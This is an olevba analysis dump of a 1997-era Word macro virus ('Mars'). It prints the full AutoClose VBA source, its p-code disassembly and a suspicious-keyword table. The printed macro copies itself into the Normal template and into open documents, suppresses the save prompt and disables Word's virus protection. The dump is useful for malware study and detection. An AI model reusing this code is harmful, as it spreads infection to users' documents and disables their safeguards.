olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.DWMVCK1.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.DWMVCK1.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mars.bas 
in file: Virus.MSWord.DWMVCK1.h - OLE stream: 'Macros/VBA/Mars'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro created 11/16/97 by Mars\r\n\r\n\r\n\r\nBengkalis\r\n"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Mars.AutoClose"
    On Error GoTo DoCancel
    Application.ScreenUpdating = False
    
    Set ActiveDoc = ActiveDocument
    If (ActiveDocument.VBProject.VBComponents.Count = 1) And (Left$(ActiveDocument.Name, 8) <> "Document") Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Mars", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If
    
    Set GlobalDoc = NormalTemplate
    If (NormalTemplate.VBProject.VBComponents.Count = 1) Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Mars", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    DayMonth = Day(Date) * 100 + Month(Date)
    If (DayMonth = 1611) Or (Day(Date) = 1) Then
        With Assistant.NewBalloon
            .Animation = msoAnimationGreeting
            .Text = "Have a nice day"
            .Icon = msoIconTip
            .Show
        End With
    End If
    Application.ScreenUpdating = True
    
DoCancel:
    Options.VirusProtection = False

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.DWMVCK1.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1117 bytes
' Macros/VBA/Mars - 2442 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError DoCancel 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #3:
' Line #4:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #6:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "Mars"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #7:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #8:
' 	EndIfBlock 
' Line #9:
' Line #10:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #12:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "Mars"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	EndIfBlock 
' Line #15:
' Line #16:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	Add 
' 	St DayMonth 
' Line #17:
' 	Ld DayMonth 
' 	LitDI2 0x064B 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #18:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #19:
' 	Ld msoAnimationGreeting 
' 	MemStWith Animation 
' Line #20:
' 	LitStr 0x000F "Have a nice day"
' 	MemStWith Then 
' Line #21:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #22:
' 	ArgsMemCallWith Show 0x0000 
' Line #23:
' 	EndWith 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #26:
' Line #27:
' 	Label DoCancel 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' Line #30:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

